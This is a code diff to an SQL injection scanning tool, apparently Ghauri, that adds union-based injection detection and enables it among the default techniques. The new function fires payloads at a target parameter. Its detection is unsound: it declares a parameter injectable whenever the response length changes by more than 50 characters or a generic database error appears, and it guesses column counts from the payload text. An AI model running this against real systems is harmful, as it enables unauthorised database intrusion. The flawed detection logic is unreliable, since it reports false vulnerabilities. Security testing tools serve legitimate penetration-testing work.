@@ -1264,6 +1264,200 @@ def check_timebased_sqli(
     return None
 
 
+def check_unionbased_sqli(
+    base,
+    parameter,
+    url="",
+    data="",
+    headers="",
+    injection_type="",
+    proxy="",
+    batch=False,
+    is_multipart=False,
+    timeout=30,
+    delay=0,
+    timesec=5,
+    dbms=None,
+    prefix=None,
+    suffix=None,
+    is_json=False,
+    retry=3,
+    possible_dbms=None,
+    code=None,
+):
+    Response = collections.namedtuple(
+        "SQLi",
+        [
+            "url",
+            "data",
+            "path",
+            "title",
+            "param",
+            "vector",
+            "payload",
+            "base",
+            "prefix",
+            "suffix",
+            "attacks",
+            "injection_type",
+            "response_time",
+            "injected",
+            "prepared_vector",
+            "number_of_requests",
+            "backend",
+            "payload_type",
+            "payload_raw",
+            "columns_count",
+        ],
+    )
+    union_based_payloads = fetch_db_specific_payload(
+        dbms=dbms,
+        booleanbased_only=False,
+        timebased_only=False,
+        stack_queries_only=False,
+        error_based_only=False,
+        union_based_only=True,
+    )
+    param_key = parameter.key
+    param_value = parameter.value
+    injection_type = injection_type.upper()
+    is_injected = False
+    end_detection_phase = False
+    is_different_status_code_injectable = False
+    http_firewall_code_counter = 0
+    error_msg = None
+    terminate_on_errors = False
+    terminate_on_web_firewall = False
+    union_based_payloads = get_payloads_with_functions(
+        payloads=union_based_payloads,
+        possible_dbms=possible_dbms,
+        injection_type=injection_type,
+    )
+    union_based_payloads = payloads_to_objects(
+        payloads=union_based_payloads,
+        parameter=parameter,
+        prefix=prefix,
+        suffix=suffix,
+        is_json=is_json,
+    )
+    logger.debug(f"loaded {len(union_based_payloads)} union-based payloads.")
+    for entry in union_based_payloads:
+        if end_detection_phase:
+            break
+        if delay > 0:
+            time.sleep(delay)
+        payload = entry.payload
+        payload_raw = entry.payload_raw
+        prepared_vector = entry.prepared_vector
+        backend = entry.backend
+        title = entry.title
+        vector = entry.vector
+        logger.payload(f"{payload}")
+        attack = inject_expression(
+            url=url,
+            data=data,
+            proxy=proxy,
+            delay=delay,
+            timesec=timesec,
+            timeout=timeout,
+            headers=headers,
+            parameter=parameter,
+            expression=payload,
+            is_multipart=is_multipart,
+            injection_type=injection_type,
+        )
+        if not attack.ok:
+            logger.debug(f"HTTP connection problem occurred ('Connection aborted')")
+            continue
+        response_time = attack.response_time
+        status_code = attack.status_code
+        if status_code in [403, 406] and code and code not in [403, 406]:
+            logger.debug(
+                f"{attack.error_msg} HTTP error code detected. ghauri is going to retry."
+            )
+            time.sleep(0.5)
+            error_msg = attack.error_msg
+            http_firewall_code_counter += 1
+            continue
+        
+        # Check for union-based injection indicators
+        content = get_filtered_page_content(attack.text, True)
+        
+        # Look for typical union-based patterns
+        union_patterns = [
+            r"(?i)warning.*mysql_fetch",
+            r"(?i)mysql_num_rows\(\)",
+            r"(?i)mysql_fetch_array\(\)",
+            r"(?i)mysql_fetch_assoc\(\)",
+            r"(?i)mysql_fetch_row\(\)",
+            r"(?i)ORA-\d+",
+            r"(?i)Microsoft.*ODBC.*SQL Server",
+            r"(?i)PostgreSQL.*ERROR",
+            r"(?i)column.*does not exist",
+            r"(?i)The used SELECT statements have a different number of columns",
+            r"(?i)All queries combined using a UNION.*must have an equal number of expressions",
+        ]
+        
+        union_detected = False
+        for pattern in union_patterns:
+            if re.search(pattern, content):
+                union_detected = True
+                break
+        
+        # Also check for successful union injection (no errors but different content)
+        if not union_detected:
+            base_content = get_filtered_page_content(base.text, True)
+            if len(content) != len(base_content) and abs(len(content) - len(base_content)) > 50:
+                union_detected = True
+        
+        if union_detected:
+            is_injected = True
+            _it = injection_type
+            if param_key == "#1*":
+                _it = "URI"
+            if is_multipart:
+                message = f"(custom) {injection_type} parameter '{mc}{parameter.type}{param_key}{nc}' appears to be '{mc}{title}{nc}' injectable"
+            elif is_json:
+                message = f"(custom) {injection_type} parameter '{mc}{parameter.type}{param_key}{nc}' appears to be '{mc}{title}{nc}' injectable"
+            else:
+                message = f"{_it} parameter '{mc}{parameter.type}{param_key}{nc}' appears to be '{mc}{title}{nc}' injectable"
+            logger.notice(message)
+            
+            # Determine number of columns
+            columns_count = 3  # Default
+            if "NULL,NULL,NULL,NULL,NULL" in payload:
+                columns_count = 5
+            elif "NULL,NULL,NULL,NULL" in payload:
+                columns_count = 4
+            elif "NULL,NULL,NULL" in payload:
+                columns_count = 3
+            
+            retval = Response(
+                url=attack.url,
+                data=attack.data,
+                path=base.path,
+                title=title,
+                param=parameter,
+                vector=vector,
+                payload=payload,
+                base=base,
+                prefix=entry.prefix,
+                suffix=entry.suffix,
+                attacks=[attack],
+                injection_type=injection_type,
+                response_time=response_time,
+                injected=is_injected,
+                prepared_vector=prepared_vector,
+                number_of_requests=1,
+                backend=backend,
+                payload_type="union-based",
+                payload_raw=payload_raw,
+                columns_count=columns_count,
+            )
+            return retval
+    return False
+
+
 def check_errorbased_sqli(
     base,
     parameter,
@@ -2152,7 +2346,7 @@ def check_injections(
     delay=0,
     timesec=5,
     dbms=None,
-    techniques="BTE",
+    techniques="BTEU",
     possible_dbms=None,
     session_filepath=None,
     force_dbms=None,
@@ -2334,6 +2528,38 @@ def check_injections(
             priorities.update({"time-based": tsqli})
             vectors.update({"time_vector": tsqli.prepared_vector})
             dbms = tsqli.backend if not dbms else dbms
+    # Union-based SQL injection check
+    usqli = None
+    is_injected_union = False
+    if "U" in techniques:
+        usqli = check_unionbased_sqli(
+            base,
+            parameter,
+            url=url,
+            data=data,
+            headers=headers,
+            injection_type=injection_type,
+            proxy=proxy,
+            batch=batch,
+            is_multipart=is_multipart,
+            timeout=timeout,
+            delay=delay,
+            timesec=timesec,
+            dbms=dbms,
+            prefix=prefix,
+            suffix=suffix,
+            is_json=is_json,
+            retry=retries,
+            possible_dbms=possible_dbms,
+            code=code,
+        )
+        if usqli and isinstance(usqli, str) and usqli == "next parameter":
+            return None
+        is_injected_union = bool(usqli and usqli.injected)
+        if is_injected_union:
+            priorities.update({"union-based": usqli})
+            vectors.update({"union_vector": usqli.prepared_vector})
+            dbms = usqli.backend if not dbms else dbms
     if "E" in techniques and not possible_dbms:
         esqli = check_errorbased_sqli(
             base,
@@ -2365,8 +2591,8 @@ def check_injections(
             prefix = esqli.prefix if not prefix else prefix
             suffix = esqli.suffix if not suffix else suffix
             sqlis.append(esqli)
-    is_injected = bool(is_injected_error or is_injected_bool or is_injected_time)
-    is_vulnerable = is_injected_error
+    is_injected = bool(is_injected_error or is_injected_bool or is_injected_time or is_injected_union)
+    is_vulnerable = is_injected_error or is_injected_union
     if is_injected:
         priority_keys = list(priorities.keys())
         error_based_in_priority = bool("error-based" in priority_keys)
@@ -2374,6 +2600,19 @@ def check_injections(
         # then we need to dump both of the payloads as in case of error based injection we don't confirm rest of the injections
         if is_injected_error:
             ms = f"Ghauri identified that the parameter '{param_name}' is injectable with error-based"
+            if is_injected_bool:
+                ms += ", boolean based"
+                sqlis.append(priorities.get("boolean-based"))
+            if is_injected_time:
+                ms += ", time based"
+                sqlis.append(priorities.get("time-based"))
+            if is_injected_union:
+                ms += ", union based"
+                sqlis.append(priorities.get("union-based"))
+            ms += " technique(s)."
+            logger.debug(ms)
+        elif is_injected_union:
+            ms = f"Ghauri identified that the parameter '{param_name}' is injectable with union-based"
             if is_injected_bool:
                 ms += ", boolean based"
                 sqlis.append(priorities.get("boolean-based"))
